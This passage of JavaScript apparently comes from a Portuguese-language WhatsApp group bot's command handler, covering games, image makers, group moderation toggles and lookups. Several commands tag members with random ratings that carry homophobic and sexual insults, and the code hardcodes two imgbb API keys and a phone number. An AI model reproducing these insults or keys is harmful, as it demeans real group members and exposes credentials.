const strChat = `*„Äéüìå·é¨’è·è¢·é¨·é°·é™Œù·é†œ¥ œ¥ œ¥·è¢œ¥Œù·é¨ŒùÕ≤·é¨‚öîÔ∏è„Äè*

@${sender.replace(
"@s.whatsapp.net",
""
)} _est√° te desafiando para uma partida de jogo da velha..._

_[ ${argss[1]} ] Use *„ÄéS„Äè* para aceitar ou *„ÄéN„Äè* para n√£o aceitar..._
`;
tomioka.sendMessage(from, strChat, MessageType.text, {
quoted: tomio, contextInfo: tome,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});

break
case  'resetavelha':
case  'resetajogodavelha':
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {

fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");

const chatJqual = `*üïπÔ∏èJOGO DA VELHA RESETADO...üïπÔ∏è*`
tomioka.sendMessage(from, chatJqual, MessageType.text, )

} else {

enviar(`N√£o a nenhuma sess√£o em andamento...`);

}
break
//_RANKS E %
case 'gay': //by gauger 
tomioka.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 110)}`
body = [body.slice(5)]   
rspst = `*Tu √© mano?üò≥üòå*\n\n*_${body}_ voc√™ √© ${random}% GAYü§≠üåà* __`
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar(rspst)          
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid			 			   			   			 
if (mentioned.length > 1) {
teks = []
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)	
tomioka.sendMessage(from, mentioned)
} else {
mentions(`*Tu √© mano?üò≥üòå*\n\n*_@${mentioned[0].split('@')[0]}_ Voc√™ √© ${random}% GAYüåàü§≠*`, mentioned, true)}
break
case '%gay':		
if (args.length < 1) return enviar ('marque os gay do gp!')
rate = body.slice(5)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como voc√™ √© gay: *'+rate+'*\n\nSua porcentagem gay : '+ kl+'%\n esse ai ama d√° o cu', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%feio':		
if (args.length < 1) return enviar ('marque alguem fei que doi!')
rate = body.slice(6)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como voc√™ √© feio(a): *'+rate+'*\n\nSua porcentagem de feiura √© : '+ kl+'%\n parece um sarigue kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%lindo':		
if (args.length < 1) return enviar ('marque alguem bonito!')
rate = body.slice(8)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como voc√™ √© lindo(a): *'+rate+'*\n\nSua porcentagem de Lindeza √© : '+ kl+'%\n parece um boleto pago kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%gostoso':		
if (args.length < 1) return enviar ('marque sua m√£e aquela gostosa!')
rate = body.slice(9)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'tu e gostoso(a) ser√°?: *'+rate+'*\n\nSua porcentagem de gostoso √© : '+ kl+'%ü§§\n slk comia ate o pau mofarüåö kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%gado':		
if (args.length < 1) return enviar ('marque um gado!')
rate = body.slice(6)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'tu e gado(a) ser√°?: *'+rate+'*\n\nSua porcentagem de gado √© : '+ kl+'%üòè\n maluco falta comer um buraco na parede kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_MOSTRA O CASAL DO GRUPO 
case 'casal':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `10%`, `20%`, `40%`, `50%`, `60%`, `80%`, `90%`, `100%`, `99999%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
teks = `*encontrei um casalzao‚ù§Ô∏è‚ù§Ô∏è*\n\n1= @${teupai11.jid.split('@')[0]}\ne esse\n2= @${teupai21.jid.split('@')[0]}\ncom : ${shipted} de chance de dar certo `
membr.push(teupai11.jid)
membr.push(teupai21.jid)
mentions(teks, membr, true)
break
case 'papel': 
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/burn-paper?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'cup':              
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(4)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/funny-cup?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
//_LISTAR USU√ÅRIO ONLINE
case 'online':
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(tomioka.chats.get(ido).presences), tomioka.user.jid]
tomioka.sendMessage(from, 'Lista de usu√°rios online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
quoted: msg,
contextInfo: {
mentionedJid: online
}
})
break
//_PASSAR IMAGEM PARA LINK 
case 'tourl':
if (!isPremium) return enviar ('s√≥ premium')

var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('espere')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imurl = `${anu.display_url}`
enviar(imurl)
}
break
//_CHANCES MOSTRA PORCENTAGEM DO QUE ESPECIFICAR
case 'chance':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
if (args.length < 1) return tomioka.sendMessage(from, `Voc√™ precisa digitar da forma correta\nExemplo: ${prefix}chance da vaca nao dar leite amanha`, text, {quoted: msg})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(7)}\n\n√© de... ${random}%`
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
//_FOTOS SHITPOST
case 'shiti':
case 'shit':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/shitii.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
tomioka.sendMessage(from, buffer, image, {caption: 'aqui est√°:)', quoted: msg})
break
//_PLAQUINHAS
case 'pmake':

if (!isPremium) return enviar ('s√≥ premium')

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 15) return enviar ('O texto √© longo, at√© 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://ubbornag.sirv.com/Screenshot_20210513-151821.png?text.0.text=${teks}&text.0.position.x=-40%25&text.0.position.y=-65%25&text.0.size=30&text.0.color=000000&text.0.opacity=53&text.0.font.family=Shadows%20Into%20Light%20Two&text.0.outline.blur=15`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Ta na m√£o üòà'})
break
case 'pmake2':
if (!isPremium) return enviar ('s√≥ premium')

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://ighteede.sirv.com/pack%20plaquinha%20%2B18%20BY%20sombrio/pack%20plaquinha%20%2B18%20BY%20sombrio/Screenshot_2021-04-10-22-59-23-1.png?text.0.text=${teks}&text.0.position.x=-36%25&text.0.position.y=-39%25&text.0.size=23&text.0.color=000000&text.0.opacity=54&text.0.font.family=Shadows%20Into%20Light`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Toma ai üòàüíÖ '})
break
case 'anagrama':

if(!isGroup) return enviar('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return enviar('comando apenas para admins')
if(args.length == 0) return enviar('use *anagrama ativar para ativar o jogo do anagrama\npara desativar user *anagrama desativar')
if (args.join(' ') === 'ativar') {
if(fs.existsSync(`./src/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
enviar(`o jogo j√° foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
tomioka.sendMessage(from, `
‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚âΩ„Äå üëæ ANAGRAMA üëæ „Äç
‚îÇ‚ûΩ DESCUBRA A PALAVRA
‚îÇ‚ûΩ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
‚îÇ‚ûΩ DICA: ${palavrasANA[anaaleatorio].dica}
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
`,MessageType.text)
}
} else if (args.join(' ') ==='desativar') {
if(!fs.existsSync(`./src/anagrama-${from}.json`)) return enviar('n√£o tem como desativar o jogo do anagrama p√¥s ele n√£o foi ativado')
fs.unlinkSync(`./src/anagrama-${from}.json`)
enviar("desativado com sucesso")
}
break
case 'gostosas':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
teks = `
Paradas!ü§öü§ö\n\n1=ü§öü§≠@${o1.jid.split('@')[0]}ü§öü§≠\n\n\n2=ü§öü§≠@${o2.jid.split('@')[0]}ü§öü§≠\n\n\n3=ü§öü§≠@${o3.jid.split('@')[0]}ü§öü§≠\n\n\n4=ü§öü§≠@${o4.jid.split('@')[0]}ü§öü§≠\n\n\n5=ü§öü§≠@${o5.jid.split('@')[0]}ü§öü§≠`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break
case 'antiloc':

if (!isGroup) return enviar(`[??] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[üìç] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiLoc) return enviar('Anti loc foi reativado')
antiloc.push(from)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc))
enviar('Ativou com sucesso o recurso de anti loc neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
antiloc.splice(from, 1)
fs.writeFileSync('./database/antiloc.json', JSON.stringify(antiloc))
enviar('Desativou com sucesso o recurso de anti loc neste grupo‚úîÔ∏è')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'anticatalogo':
case 'cat√°logo':
case 'catalogo':
if (!isGroup) return enviar('s√≥ grupo')
if (!isGroupAdmins) return enviar('s√≥ adm')
if (!isBotGroupAdmins) return enviar('bot precisa ser adm')
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiCatalogo) return enviar('J√° est√° ativo!')
anticatalogo.push(from)
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
enviar('a—ÇŒπŒΩœÉœÖ cœÉ–º —ïœÖc—î—ï—ïœÉ œÉ —è—îcœÖ—è—ïœÉ Œ±Œ∑—ÇŒπ-cŒ±—ÇŒ±ÃÅ‚ÑìœÉgœÉ Œ∑—î—ï—Ç—î g—èœÖœÅœÉ ‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
let position = false
Object.keys(anticatalogo).forEach((i) => {
if (anticatalogo[i] === from) {
position = i
}
})
if (position !== false) {
anticatalogo.splice(position, 1)}
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
enviar('∆ä—î—ïŒ±—ÇŒπŒΩœÉœÖ cœÉ–º —ïœÖc—î—ï—ïœÉ œÉ Œ±Œ∑—ÇŒπ-cŒ±—ÇŒ±ÃÅ‚ÑìœÉgœÉ Œ∑—î—ï—Ç—î g—èœÖœÅœÉ ‚úîÔ∏è')
} else {
enviar('1üá¶‚Äãüáπ‚ÄãüáÆ‚Äãüáª‚Äãüá¶‚Äã 0üá©‚Äãüá™‚Äãüá∏‚Äãüá¶‚Äãüáπ‚ÄãüáÆ‚Äãüáª‚Äãüá¶‚Äã')
}
break
case 'antidoc':

if (!isGroup) return enviar(`[üìç] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[üìç] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
antidoc.push(from)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
enviar('Ativou com sucesso o recurso de anti documento neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
antidoc.splice(from, 1)
fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
enviar('Desativou com sucesso o recurso de antidocumento neste grupo‚úîÔ∏è')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'infobot':
temporlg = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "informa√ß√µes do bot",
"description": "Clique nos bot√µes baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'Velocidade do bot',
"rowId": `  ping`
},
{
"title": 'info bot e info do dispositivo',
"rowId": ` status`
}
]
}
]                    
}
}, {quoted:msg})
tomioka.relayWAMessage(temporlg)
break
case 'docu':
tope = fs.readFileSync('./assets/primeiro_teste.html')
tomioka.sendMessage(from, tope, MessageType.document, {mimetype: 'text/html', quoted: tomio, contextInfo: tome, filename: 'Tomioka.html'})
break
case 'anticontato':


if (!isBotGroupAdmins) return enviar(`[üìç] O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return enviar('Hmmmm')
if (Number(args[0]) === 1) {
anticontato.push(from)
fs.writeFileSync('./database/anticontato.json', JSON.stringify(anticontato))
enviar('Ativou com sucesso o recurso de anti contato neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
anticontato.splice(from, 1)
fs.writeFileSync('./database/anticontato.json', JSON.stringify(anticontato))
enviar('Desativou com sucesso o recurso de anti contato neste grupo‚úîÔ∏è')
} else {
enviar('1 para ativar, 0 para desativar')
}
} catch {
enviar('Deu erro, tente novamente :/')
}

break
case 'antispam':

if (!isGroup) return enviar(`[üìç] SOMENTE EM GRUPOS`)
if (!isBotGroupAdmins) return enviar(`[üìç] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return enviar('SELECIONE 1/0')
if (args[0] === "1") {
if (AntiVirtex) return enviar('reativo sistema de anti trava(spam de txt)')
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
enviar('_Sucesso em ligar antispam neste grupo_')
} else if (args[0] === "0") {
if (!AntiVirtex) return enviar('ja esta ativo')
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
enviar('_Sucesso na ativa√ßao de antispam_')
} else {
enviar('SELECIONE 1/0')
}
break

//_RANKS E %
case '%f':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
random = `${Math.floor(Math.random() * 100)}`
hasil = `  ${body.slice(7)}\n\      ${random}% `
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
case '%b':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
random = `${Math.floor(Math.random() * 100)}`
hasil = `  ${body.slice(7)}\n\      ${random}% `
tomioka.sendMessage(from, hasil, text, {quoted: msg, contextInfo: {mentionedJid: [sender]}})
break
//_COMANDOS ABRIR FECHAR GRUPO
case 'abrir':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar (ptbr.group())
if (!isGroupAdmins) return enviar (ptbr.admin())
if (!isBotGroupAdmins) return enviar (ptbr.Badmin())
open = {
text: `Grupo aberto por: @${sender.split("@")[0]}`,
contextInfo: {
mentionedJid: [sender]
}
}
tomioka.groupSettingChange (from, GroupSettingChange.messageSend, false)
tomioka.sendMessage(from, open, text, {
quoted: msg
})
break
case 'fechar':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
var nomor = msg.participant
const close = {
text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *apenas administrador* quem pode enviar mensagens`,
contextInfo: { mentionedJid: [nomor] }
}
tomioka.groupSettingChange (from, GroupSettingChange.messageSend, true);
enviar(close)
break
//GIF 
/*
case 'cumgif':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return enviar (ptbr.nsfw())
enviar(ptbr.waitsfw()) 
axios.get('https://nekos.life/api/v2/img/cum').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
a = webp2gifFile(buf)
mp4 = getBuffer(a.result)
tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: msg, caption: '‚úÖ'})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('‚ùåocorreu um erro‚ùå\n\nTente novamente. ')
}
break*/
case 'tourl':
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
enviar('espere')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
imurl = `${anu.display_url}`
enviar(imurl)
}
break
case 'cep':
if (args.length < 1) return enviar ('digite o cep que deseja buscar')
cep = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/cep/v1/${cep}`)
if (hehe.error) return enviar (hehe.error)
ccg =
` INFORMA√á√ïES DO CEP
‚Ä£ Cep: ${hehe.cep}
‚Ä£ Estado: ${hehe.state}
‚Ä£ Cidade: ${hehe.city}`
tomioka.sendMessage(from, ccg, text, {quoted:msg})
break

/*case 'ddd':
if (args.length < 1) return enviar ('digite o ddd que deseja buscar')
ddd = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
if (hehe.error) return enviar (hehe.error)
ccg =
` INFORMA√á√ïES DO DDD
‚Ä£ Estado: ${hehe.state}
‚Ä£ Cidades: 
${hehe.cities}\n`
tomioka.sendMessage(from, ccg, text, {quoted:msg})
break*/
case 'convite':
if (args.length < 0) return enviar ('Digite o link do grupo ')
var codeInvite = body.slice(9).split('https://chat.whatsapp.com/')[1]
if (!codeInvite) return enviar ('certifique-se de que o link est√° correto! ')                 
if (args.length > 300) return tomioka.sendMessage(from, 'M√°ximo 300 caracteres', msgType.text, {quoted: msg})
var nomor = msg.participant
teks1 = `[CONVITE]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(9)}`
var options = {
text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar("O seu convite foi enviado ao meu dono e esta em analise; Spam = block + ban.")
break
case 'ddd':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar ('BOT PRECISA DE ALGUM DDD DE UM NUMERO')
luc4rio1 = body.slice(5)
luc4rio2 = await fetchJson(`https://www.luc4rio-rest-api.tk/api/consultas/internacional?ddd=${luc4rio1}`, {method: 'get'})
if (luc4rio2.Erro) return enviar (luc4rio2.Erro)
luc4rio3 = 
` BEM VINDO AO MENU DE CONSULTA\n\n„Äò INFORMA√á√ïES „Äô
‚ß¥ „Äò CIDADES „Äô : ${luc4rio2.Cidades}
‚ß¥ „Äò ESTADO „Äô : ${luc4rio2.Estado}
„Äò ${luc4rio2.Mensagem} „Äô\n\nN√ÉO E POSS√çVEL PUXA CONSULTA DE TELEFONE\n\nBY : TioTomioka`
tomioka.sendMessage(from, luc4rio3, text, {quoted: msg})
break

case 'info':
case 'infome':
case 'perfil':
case 'eu':
try {
         var ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)
            } catch {
               var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
            }
var palavras = ["Se voc√™ tra√ßar metas absurdamente altas e falhar, seu fracasso ser√° muito melhor que o sucesso de todos. ‚Äì James Cameron, Cineastra", "O sucesso normalmente vem para quem est√° ocupado demais para procurar por ele ‚Äì Henry David Thoreau, fil√≥sofo", "A vida √© melhor para aqueles que fazem o poss√≠vel para ter o melhor ‚Äì John Wooden, jogador e treinador de basquete", "Os empreendedores falham, em m√©dia, 3,8 vezes antes do sucesso final. O que separa os bem-sucedidos dos outros √© a persist√™ncia ‚Äì Lisa M. Amos, executiva", "Se voc√™ n√£o est√° disposto a arriscar, esteja disposto a uma vida comum ‚Äì Jim Rohn, empreendedor", "Escolha uma ideia. Fa√ßa dessa ideia a sua vida. Pense nela, sonhe com ela, viva pensando nela. Deixe c√©rebro, m√∫sculos, nervos, todas as partes do seu corpo serem preenchidas com essa ideia. Esse √© o caminho para o sucesso ‚Äì Swami Vivekananda, pensador hindu", "Para de perseguir o dinheiro e comece a perseguir o sucesso ‚Äì Tony Hsieh, empreendedor", "Todos os seus sonhos podem se tornar realidade se voc√™ tem coragem para persegui-los ‚Äì Walt Disney, desenhista e empreendedor", "*Ter sucesso √© falhar repetidamente, mas sem perder o entusiasmo ‚Äì Winston Churchill, pol√≠tico", "Sempre que voc√™ vir uma pessoa de sucesso, voc√™ sempre ver√° as gl√≥rias, nunca os sacrif√≠cios que os levaram at√© ali ‚Äì Vaibhav Shah, pensador", "Sucesso? Eu n√£o sei o que isso significa. Eu sou feliz. A defini√ß√£o de sucesso varia de pessoa para pessoa Para mim, sucesso √© paz anterior ‚Äì Denzel Washington, ator", "Oportunidades n√£o surgem. √â voc√™ que as cria ‚Äì Chris Grosser, fot√≥grafo", "N√£o tente ser uma pessoa de sucesso. Em vez disso, seja uma pessoa de valor ‚Äì Albert Einstein, f√≠sico", "N√£o √© o mais forte que sobrevive, nem o mais inteligente. Quem sobrevive √© o mais disposto √† mudan√ßa ‚Äì Charles Darwin, bi√≥logo", "A melhor vingan√ßa √© um sucesso estrondoso ‚Äì Frank Sinatra, cantor", "Eu n√£o falhei. S√≥ descobri 10 mil caminhos que n√£o eram o certo ‚Äì Thomas Edison, inventor", "Um homem de sucesso √© aquele que cria uma parede com os tijolos que jogaram nele ‚Äì David Brinkley, jornalista", "Ningu√©m pode fazer voc√™ se sentir inferior sem o seu consentimento ‚Äì Eleanor Roosevelt, primeira-dama dos EUA", "*O grande segredo de uma boa vida √© encontrar qual √© o seu destino. E realiz√°-lo ‚Äì Henry Ford, empreendedor", "Se voc√™ est√° atravessando um inferno, continue atravessando ‚Äì Churchill", "O que nos parece uma prova√ß√£o amarga pode ser uma b√™n√ß√£o disfar√ßada ‚Äì Oscar Wilde, escritor", "A dist√¢ncia entre a insanidade e a genialidade √© medida pelo sucesso ‚Äì Bruce Feirstein, roteirista", "N√£o tenha medo de desistir do bom para perseguir o √≥timo ‚Äì John D. Rockefeller, empreendedor", "N√£o tenha medo de desistir do bom para perseguir o √≥timo ‚Äì John D. Rockefeller, empreendedor", "A felicidade √© uma borboleta que, sempre que perseguida, parecer√° inating√≠vel; no entanto, se voc√™ for paciente, ela pode pousar no seu ombro ‚Äì Nathaniel Hawthorne, escritor", "Se voc√™ n√£o pode explicar algo de forma simples, ent√£o voc√™ n√£o entendeu muito bem o que tem a dizer ‚Äì Einstein", "H√° dois tipos de pessoa que v√£o te dizer que voc√™ n√£o pode fazer a diferen√ßa neste mundo: as que t√™m medo de tentar e as que t√™m medo de que voc√™ se d√™ bem ‚Äì Ray Goforth, executivo", "Comece de onde voc√™ est√°. Use o que voc√™ tiver. Fa√ßa o que voc√™ puder ‚Äì Arthur Ashe, tenista","As pessoas me perguntam qual √© o papel que mais gostei de interpretar. Eu sempre respondo: o pr√≥ximo ‚Äì Kevin Kline, ator","Descobri que, quanto mais eu trabalho, mais sorte eu pare√ßo ter ‚Äì Thomas Jefferson, pol√≠tico","O ponto de partida de qualquer conquista √© o desejo ‚Äì Napoleon Hill, assessor pol√≠tico"]
var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const proximolvlxp = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
buffer = await getBuffer(ppimg)
hisil = `
     „Äåüî•PERFIL üî• „Äç
üóí Nome : ${pushname}
‚úçÔ∏èComandos usados : ${countMessage[ind].numbers[indnum].cmd_messages}
üëÄ Mensagens Enviadas : ${countMessage[ind].numbers[indnum].messages}
ü™Ä N√∫mero : wa.me/${sender.split('@')[0]}
üïπ Xp : ${getLevelingXp(sender)}/${proximolvlxp}
üìä N√≠vel : ${getLevelingLevel(sender)}
üõ° Patente : ${patt}
‚è≥ Tempo  : ${time}
üêÇ N√≠vel gado : ${nivelgador}${nivelgado2r}%
üòà N√≠vel puta : ${putar}${putar2}%
üòã N√≠vel de gostosura : ${gostosurar}${gostosurar2}%
üçº Valor do programa : R$${programa}

‚ûª CONSELHO :
${conselho}
`
tomioka.sendMessage(from, buffer, image, {caption: hisil,quoted: tomio, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'traduzir': //@SUPRA √¢‚Ñ¢¬°
if (args.length < 1) return enviar ('Insira o texto que voc√É¬™ deseja traduzir')
tomioka.updatePresence(from, Presence.composing)
tels = body.slice(10)
try {
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/translate?text=${tels}&from=id&to=pt`, {
method: 'get'
})
enviar('traduzido')
} catch {
enviar(mess.ferr)
}
break
case 'simbolos':

